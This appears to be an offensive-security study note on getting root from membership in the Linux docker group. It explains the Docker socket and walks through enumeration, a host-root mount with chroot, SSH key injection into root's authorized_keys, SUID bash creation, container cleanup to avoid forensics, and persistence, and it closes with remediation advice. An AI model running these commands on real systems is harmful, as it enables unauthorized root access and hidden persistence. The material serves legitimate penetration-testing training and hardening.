---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.19 Docker Group Membership"
---

# 44.19 Docker Group Membership Abuse

## 1. Introduction

Docker has revolutionized application deployment by popularizing containerization. However, from a security perspective, access to the Docker daemon is functionally equivalent to having `root` access to the host operating system. 

By default, the Docker daemon binds to a Unix socket (`/var/run/docker.sock`) owned by `root` and the `docker` group. To allow unprivileged users to manage containers without utilizing `sudo`, administrators frequently add these users to the `docker` group. This is a catastrophic security misconfiguration. If an attacker compromises a user account that is a member of the `docker` group, they can instantly escalate their privileges to full `root` on the host machine.

## 2. Core Concepts and Underlying Mechanisms

The vulnerability stems from the architecture of the Docker engine and the capabilities of containerization.

### 2.1 The Docker Daemon
The `dockerd` process runs as `root`. When a user executes a command like `docker run`, the Docker client communicates with the daemon via the socket. Because the daemon runs as root, any container it creates is instantiated with root-level privileges (unless user namespaces are strictly enforced, which is rare).

### 2.2 Host File System Mounting (Volume Binding)
Docker allows users to mount directories from the host filesystem into the container's filesystem using the `-v` flag. Since the container runs as root, if an attacker mounts the host's root filesystem (`/`) into the container, the attacker can interact with the host's files as the root user from within the container.

## 3. Technical Breakdown and Architecture

The following ASCII diagram maps the process of abusing the `docker` group to achieve root access on the host.

```text
+-------------------------------------------------------------------------+
|                  DOCKER GROUP ABUSE ARCHITECTURE                        |
|                                                                         |
|  [ Host Machine ]                                                       |
|  User 'dev' (Member of 'docker' group)                                  |
|         |                                                               |
|         v                                                               |
|  Executes: docker run -v /:/mnt/host_root -it alpine sh                 |
|         |                                                               |
|         +--[ Unix Socket /var/run/docker.sock ]--> [ dockerd (root) ]   |
|                                                            |            |
|                                                            v            |
|  +--------------------------------------------------------------+       |
|  | [ Container 'alpine' ]                                       |       |
|  | Runs as root                                                 |       |
|  | /mnt/host_root/ <======= Bound to =======> Host's /          |       |
|  |                                                              |       |
|  | Attacker inside container:                                   |       |
|  | # chroot /mnt/host_root                                      |       |
|  | # id -> uid=0(root) gid=0(root)                              |       |
|  +--------------------------------------------------------------+       |
|                                                                         |
+-------------------------------------------------------------------------+
```

## 4. Enumeration Strategy

Identifying this vulnerability is one of the simplest checks during Linux enumeration.

### 4.1 Checking Group Membership
The first step is checking the group memberships of the compromised user using the `id` or `groups` command.
```bash
id
# Output: uid=1001(dev) gid=1001(dev) groups=1001(dev),999(docker)
```
If `docker` is listed in the groups, the system is vulnerable.

### 4.2 Checking Socket Permissions
If the user is not in the group, check if the Docker socket itself is world-writable (a rare but fatal misconfiguration).
```bash
ls -la /var/run/docker.sock
# Vulnerable: srw-rw-rw- 1 root docker 0 Oct 10 10:00 /var/run/docker.sock
```

### 4.3 Listing Available Images
To execute the exploit, you need a Docker image to run. List the available images on the host:
```bash
docker images
```
Look for small, minimal images like `alpine`, `ubuntu`, `debian`, or `busybox`. If no images are present, you may need to pull one from the internet (`docker pull alpine`), assuming the host has outbound internet access.

## 5. Exploitation Methodology

The goal is to spawn a container, mount the host's root filesystem, and interact with it.

### 5.1 The Standard Mount and Chroot Exploit
1. Run a container, mounting the host's `/` to `/mnt` inside the container. We use the `-it` flags for an interactive terminal.
```bash
docker run -v /:/mnt -it alpine sh
```
*Note: If `alpine` is not available, substitute it with any image name found via `docker images`.*

2. Once inside the container, you are root. However, your filesystem is the container's filesystem, with the host's filesystem located at `/mnt`.
3. To drop into a shell where the host's filesystem is treated as the root filesystem, use `chroot`:
```bash
chroot /mnt sh
```
4. You now have a root shell operating directly on the host's filesystem. You can read `/etc/shadow`, write to `/etc/passwd`, or extract SSH keys.

### 5.2 Alternative: SSH Key Injection
If `chroot` is not preferred or behaves strangely, you can simply write your SSH public key into the host root's `authorized_keys` file directly from the container.

1. Generate an SSH key pair on your attacker machine.
2. Read the public key (`id_rsa.pub`).
3. Run the container and mount the host's `/root` directory:
```bash
docker run -v /root:/mnt_root -it alpine sh
```
4. Append your public key:
```bash
mkdir -p /mnt_root/.ssh
echo "ssh-rsa AAAAB3Nz... attacker@kali" >> /mnt_root/.ssh/authorized_keys
chmod 600 /mnt_root/.ssh/authorized_keys
```
5. SSH into the host machine as root from your attacker machine:
```bash
ssh root@<target_ip>
```

### 5.3 Alternative: SUID Binary Creation
You can use the container to create a SUID bash binary on the host filesystem.
```bash
docker run -v /:/mnt -it alpine sh
# Inside container:
cp /mnt/bin/bash /mnt/tmp/rootbash
chmod +s /mnt/tmp/rootbash
exit
# Back on host as low privileged user:
/tmp/rootbash -p
```

## 6. Edge Cases and Bypasses

- **No Images / No Internet**: If the host has no images and no internet access, you cannot `docker run`. You must find a way to import an image. You can save an image on your attacker machine (`docker save alpine > alpine.tar`), transfer `alpine.tar` to the target, and load it (`docker load -i alpine.tar`).
- **SELinux / AppArmor Restriction**: Hardened systems might implement SELinux or AppArmor profiles that restrict what the Docker daemon can mount, or prevent `chroot`. While these mitigate the basic attack, complex escapes may still be possible.
- **Rootless Docker**: Modern Docker environments can be configured as "Rootless". In this mode, the Docker daemon runs entirely within a user namespace. If you exploit rootless docker, you only gain root privileges *within the container's namespace*, mapping back to the unprivileged user on the host. This mitigates the privilege escalation vector completely.

## 7. Post-Exploitation & Persistence

After achieving root via Docker:
- Clean up the spawned container to avoid leaving obvious forensic artifacts.
```bash
docker ps -a  # Find the container ID
docker rm -f <container_id>
```
- Establish standard host-level persistence (SSH keys, cron jobs) rather than relying on Docker for future access.

## 8. Defense & Remediation

The remediation is stark and straightforward:

- **Do Not Use the Docker Group**: Never add human users to the `docker` group. Treat membership in this group as equivalent to having passwordless `sudo` access.
- **Use Sudo for Docker**: If developers need to run containers, grant them specific `sudo` rules for the exact `docker` commands they need, rather than blanket group access.
- **Implement Rootless Docker**: Migrate the infrastructure to Rootless Docker, which allows users to run containers without the daemon requiring root privileges on the host.
- **Namespace Remapping**: Enable user namespace remapping (`--userns-remap`) in the Docker daemon configuration. This maps the root user inside the container to a non-root user on the host, neutralizing the volume mount attack.
- **Auditing**: Regularly audit group memberships and ensure no unauthorized accounts have been added to the `docker` group.

## 9. Chaining Opportunities

Docker group abuse is a terminal exploit (leads directly to root), but it often chains with:
- **Web Application Compromise**: Achieving a shell as `www-data`, enumerating the system, and finding a password that allows lateral movement to a `dev` user account who happens to be in the `docker` group.
- **SSRF to Docker API**: If an internal web app has an SSRF vulnerability, and the Docker daemon API is exposed via TCP (port 2375) without TLS, the attacker can use SSRF to send HTTP requests to the Docker API to launch a malicious container.

## 10. Related Notes
- [[20 - LXC LXD Group Abuse]]
- [[21 - Disk Group Reading Raw Device Files]]
- [[45 - Container Escapes]]
- [[02 - Sudo Misconfigurations]]
